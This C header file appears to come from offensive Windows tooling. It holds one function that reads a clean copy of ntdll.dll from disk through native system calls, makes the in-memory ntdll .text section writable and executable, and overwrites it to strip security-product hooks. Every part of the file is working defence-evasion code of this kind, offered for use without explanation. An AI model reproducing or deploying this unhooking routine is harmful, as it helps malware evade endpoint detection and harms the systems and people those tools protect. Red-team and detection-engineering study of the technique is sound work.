#pragma once

#include <Windows.h>
#include <psapi.h>
//#include "Structs.h"
//#include "Syscalls.h"

// Library function prototypes
// ------------------------------------------------------------------------

typedef VOID(NTAPI* _RtlInitUnicodeString)(
	PUNICODE_STRING DestinationString,
	PCWSTR SourceString
	);

// Overwrite .text section of hooked Ntdll using untainted Ntdll from disk
// ------------------------------------------------------------------------

BOOL section_remap() {
	// Dynamically resolve the functions from Ntdll
	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA("Ntdll.dll"), "RtlInitUnicodeString");
	if (RtlInitUnicodeString == NULL)
		return FALSE;

	// Init some important stuff
	LPCWSTR ntdllPathW = L"\\??\\C:\\Windows\\System32\\Ntdll.dll";
	UNICODE_STRING ntdllPathU;
	OBJECT_ATTRIBUTES objectAttributes = {};
	_IO_STATUS_BLOCK ioStatusBlock = {};
	HANDLE handleNtdllDisk = NULL;
	HANDLE handleNtdllSection = NULL;
	LPVOID unhookedNtdllBaseAddress = NULL;
	LPVOID hookedNtdllBaseAddress = NULL;
	HMODULE Ntdll = NULL;
	MODULEINFO moduleInfo = {};
	PIMAGE_DOS_HEADER dosHeader = 0;
	PIMAGE_NT_HEADERS ntHeader = 0;
	PIMAGE_SECTION_HEADER sectionHeader = 0;
	LPSTR sectionName;
	ULONG oldProtection;
	LPVOID hookedNtdllTextStartAddress = NULL;
	LPVOID unhookedNtdllTextStartAddress = NULL;
	SIZE_T textSectionSize;
	NTSTATUS status;
	SIZE_T size = 0;
	LPVOID lpBaseAddress;
	SIZE_T uSize;

	// Convert Ntdll path to unicode
	RtlInitUnicodeString(&ntdllPathU, ntdllPathW);

	// Get a handle to untainted Ntdll on disk
	objectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
	objectAttributes.ObjectName = &ntdllPathU;
	status = NtCreateFile(&handleNtdllDisk, FILE_READ_ATTRIBUTES | GENERIC_READ | SYNCHRONIZE, &objectAttributes, &ioStatusBlock, NULL, 0, FILE_SHARE_READ, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if (status != STATUS_SUCCESS) {
		//printf("[-] NtCreateFile error: %X\n", status);
		return FALSE;
	}

	// Create read-only section object for on-disk Ntdll
	status = NtCreateSection(&handleNtdllSection, STANDARD_RIGHTS_REQUIRED | SECTION_MAP_READ | SECTION_QUERY, NULL, NULL, PAGE_READONLY, SEC_IMAGE, handleNtdllDisk);
	if (status != STATUS_SUCCESS) {
		//printf("[-] NtCreateSection error: %X\n", status);
		return FALSE;
	}
	//printf("%-20s 0x%p\n", "Section Handle address:", handleNtdllSection);

	// Map read-only view of section in local process
	status = NtMapViewOfSection(handleNtdllSection, NtCurrentProcess(), &unhookedNtdllBaseAddress, 0, 0, 0, &size, ViewShare, 0, PAGE_READONLY);
	if (status != STATUS_IMAGE_NOT_AT_BASE) {
		//printf("[-] NtMapViewOfSection error: %X\n", status);
		return FALSE;
	}
	//printf("%-20s 0x%p\n", "Untainted Ntdll base address: ", unhookedNtdllBaseAddress);

	// Get handle to loaded Ntdll
	Ntdll = GetModuleHandleA("Ntdll.dll");

	// Get MODULEINFO struct
	if (GetModuleInformation(NtCurrentProcess(), Ntdll, &moduleInfo, sizeof(moduleInfo)) == 0) {
		//printf("[-] GetModuleInformation error: %d\n", GetLastError());
		return FALSE;
	}

	// Get base address of hooked Ntdll from MODULEINFO struct
	hookedNtdllBaseAddress = (LPVOID)moduleInfo.lpBaseOfDll;
	//printf("%-20s 0x%p\n", "Tainted Ntdll base address: ", hookedNtdllBaseAddress);

	// Get DOS header
	dosHeader = (PIMAGE_DOS_HEADER)hookedNtdllBaseAddress;

	// Get Nt Header
	ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)hookedNtdllBaseAddress + dosHeader->e_lfanew);

	// Loop through all the PE sections until we find .text section
	for (SIZE_T i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
		// Get PE section header
		sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(ntHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		// Get section name
		sectionName = (LPSTR)sectionHeader->Name;

		// We found .text section!
		if (!strcmp(sectionName, ".text")) {
			//printf("Found .text section\n");

			// Get start address of hooked .text section
			hookedNtdllTextStartAddress = (LPVOID)((DWORD_PTR)hookedNtdllBaseAddress + (DWORD_PTR)sectionHeader->VirtualAddress);

			// Get start address of unhooked .text section
			unhookedNtdllTextStartAddress = (LPVOID)((DWORD_PTR)unhookedNtdllBaseAddress + (DWORD_PTR)sectionHeader->VirtualAddress);

			// Get size of .text section
			textSectionSize = sectionHeader->Misc.VirtualSize;

			//printf("%-20s 0x%p\n", "Tainted Ntdll .text VA: ", hookedNtdllTextStartAddress);
			//printf("%-20s 0x%p\n", "Untainted Ntdll .text VA: ", unhookedNtdllTextStartAddress);
			//printf(".text section size: %d\n", textSectionSize);

			// Change original page protection of hooked Ntdll to RWX
			lpBaseAddress = hookedNtdllTextStartAddress;
			uSize = textSectionSize;
			status = NtProtectVirtualMemory(NtCurrentProcess(), &lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			if (status != STATUS_SUCCESS) {
				//printf("[-] NtProtectVirtualMemory1 error: %X\n", status);
				return FALSE;
			}

			// Copy .text section of unhooked Ntdll into hooked Ntdll .text section
			memcpy(hookedNtdllTextStartAddress, unhookedNtdllTextStartAddress, textSectionSize);

			// Revert back to original page protections of now refreshed Ntdll
			status = NtProtectVirtualMemory(NtCurrentProcess(), &lpBaseAddress, &uSize, oldProtection, &oldProtection);
			if (status != STATUS_SUCCESS) {
				//printf("[-] NtProtectVirtualMemory2 error: %X\n", status);
				return FALSE;
			}

			break;
		}
	}

	// Cleanup
	// Unmap the local section view
	status = NtUnmapViewOfSection(NtCurrentProcess(), unhookedNtdllBaseAddress);
	if (status != STATUS_SUCCESS) {
		//printf("[-] NtUnmapViewOfSection error: %X\n", status);
		return FALSE;
	}
	NtClose(handleNtdllSection);
	NtClose(handleNtdllDisk);

	return TRUE;
}